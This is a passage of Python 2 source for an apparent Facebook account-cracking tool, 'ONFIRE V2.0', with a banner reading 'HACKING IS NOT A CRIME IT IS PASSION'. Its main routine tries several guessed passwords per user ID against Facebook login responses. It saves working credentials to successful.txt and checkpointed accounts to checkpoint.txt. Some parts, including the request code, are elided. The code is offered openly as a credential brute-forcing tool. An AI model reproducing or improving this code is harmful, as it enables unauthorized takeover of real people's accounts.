...
os.system('clear')
logo = '\n\n\x1b[1;95m\n MR-REHAN MAQSOOD \n THE OFFICIAL CMD  \n FOLLOW REHAN ON FB \x1b[1;96m         ONFIRE V2.0 \x1b[1;92m\n SPEEDUP VERSION  \n\x1b[1;97-------------------ONFIRE V2.0-------------------m\n   Author   : Rehan Maqsood\n \n-------------------ONFIRE V2.0-------------------\n             \x1b[1;92mLOADING ONFIRE MOD\n\x1b[1;97m------------------------------------------------\nHACKING IS NOT A CRIME IT IS PASSION \n------------------------------------------------ '
CorrectUsername = 'Rehan'
loop = 'true'
while loop == 'true':
    print logo
    print '\x1b[1;97m               STEPS OF LOGIN'
    print '\x1b[1;97m'
    print '\x1b[1;97m '
...
def reg():
    ...
    print ''
    print ''
    print '\x1b[1;92m  [Connected With Rehan Servers]'
    print ''
...
def reg2():
    ...
    print ''
    print '\x1b[1;95m'
    print ' \xe2\x80\xa2 THIS TOOL IS FREE \xe2\x80\xa2 '
    time.sleep(2)
    print ''
    print '\x1b[1;96m '
    print ' \xe2\x80\xa2 CODED BY REHAN MAQSOOD \xe2\x80\xa2 '
    time.sleep(5)
    login()
...
def menu():
    ...
    print ''
    print 47 * '-'
    print ' \x1b[1;91m          Mera Yaar Hans Raha He '
    print '         Barish Ki Jaye '
    print '\x1b[1;97m'
    print 47 * '-'
    print ''
    print ' [1] START'
    print ' [2] FOLLOW REHAN ON FB '
    print ''
    menu_option()
...
def crack_select():
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print ' \x1b[1;32m[REHAN-OK]     \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('successful.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print ' \x1b[1;91m[REHAN-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print ' \x1b[1;32m[REHAN-OK]     \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('successful.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print ' \x1b[1;91m[REHAN-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('checkpoint.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print ' \x1b[1;32m[REHAN-OK]     \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('successful.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print ' \x1b[1;91m[REHAN-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('checkpoint.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print ' \x1b[1;32m[REHAN-OK]     \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('successful.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print ' \x1b[1;91m[REHAN-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('checkpoint.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
